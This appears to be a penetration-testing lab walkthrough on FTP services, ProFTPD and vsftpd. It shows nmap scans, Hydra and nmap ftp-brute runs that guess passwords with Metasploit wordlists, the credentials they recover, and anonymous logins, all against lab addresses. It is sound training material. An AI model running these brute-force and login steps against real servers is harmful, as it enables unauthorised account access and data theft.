# FTP

## ProFTPD

```sh
root@attackdefense:~# nmap -sV -O 192.75.103.3 -p 21
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-28 11:02 UTC
Nmap scan report for target-1 (192.75.103.3)
Host is up (0.000052s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
MAC Address: 02:42:C0:4B:67:03 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.4 - 3.10 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Synology DiskStation Manager 5.2-5644 (94%), Netgear RAIDiator 4.2.28 (94%), Linux 2.6.32 - 2.6.35 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.15 seconds
```

Port 21 is commonly used for FTP service. After scanning, we identified that it is running proFTPD.

We can utilize the following Linux command to establish a connection with an FTP server:

```sh
root@attackdefense:~# ftp 192.75.103.3
Connected to 192.75.103.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.75.103.3]
Name (192.75.103.3:root): 
331 Password required for root
Password:
530 Login incorrect.
Login failed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bye
221 Goodbye.
```

In this case, it does not allow us to log in as an anonymous user.

So now we can utilize the Hydra tool in this case to brute force the username and password:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.75.103.3 ftp
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 11:11:50
[DATA] max 16 tasks per 1 server, overall 16 tasks, 7063 login tries (l:7/p:1009), ~442 tries per task
[DATA] attacking ftp://192.75.103.3:21/
<strong>[21][ftp] host: 192.75.103.3   login: sysadmin   password: 654321
</strong><strong>[21][ftp] host: 192.75.103.3   login: rooty   password: qwerty
</strong><strong>[21][ftp] host: 192.75.103.3   login: demo   password: butterfly
</strong><strong>[21][ftp] host: 192.75.103.3   login: auditor   password: chocolate
</strong><strong>[21][ftp] host: 192.75.103.3   login: anon   password: purple
</strong><strong>[21][ftp] host: 192.75.103.3   login: administrator   password: tweety
</strong><strong>[21][ftp] host: 192.75.103.3   login: diag   password: tigger
</strong>1 of 1 target successfully completed, 7 valid passwords found
[WARNING] Writing restore file because 5 final worker threads did not complete until end.
[ERROR] 5 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-28 11:12:30
</code></pre>

We have obtained login credentials for several users to access FTP.

Now let's try to login as `sysadmin`:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# ftp 192.75.103.3Connected to 192.75.103.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.75.103.3]
Name (192.75.103.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
<strong>ftp> ls
</strong>200 PORT command successful
150 Opening ASCII mode data connection for file list
<strong>-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
</strong></code></pre>

Logged in successfully.

We can also use Nmap instead of hydra to do this operation:

<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# nmap 192.75.103.3 --script ftp-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/common_users.txt -p21
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-28 11:22 UTC
Nmap scan report for target-1 (192.75.103.3)
Host is up (0.000062s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-brute: 
|   Accounts: 
|     rooty:qwerty - Valid credentials
|     anon:purple - Valid credentials
|     demo:butterfly - Valid credentials
|     auditor:chocolate - Valid credentials
<strong>|     sysadmin:654321 - Valid credentials
</strong>|     diag:tigger - Valid credentials
|     administrator:tweety - Valid credentials
|_  Statistics: Performed 221 guesses in 31 seconds, average tps: 7.0
MAC Address: 02:42:C0:4B:67:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 32.23 seconds
</code></pre>

## vsftps

To test if anonymous logins are enabled on the system, we can use the Nmap tool:

```sh
root@attackdefense:~# nmap 192.82.7.3 -p 21 --script=ftp-anon
Starting Nmap 7.70 ( https://nmap.org ) at 2023-12-28 11:38 UTC
Nmap scan report for target-1 (192.82.7.3)
Host is up (0.000091s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
MAC Address: 02:42:C0:52:07:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
```

so let's try to login as anonymous:

```sh
root@attackdefense:~# ftp 192.82.7.3
Connected to 192.82.7.3.
220 (vsFTPd 3.0.3)
Name (192.82.7.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Here we logged in successfully.
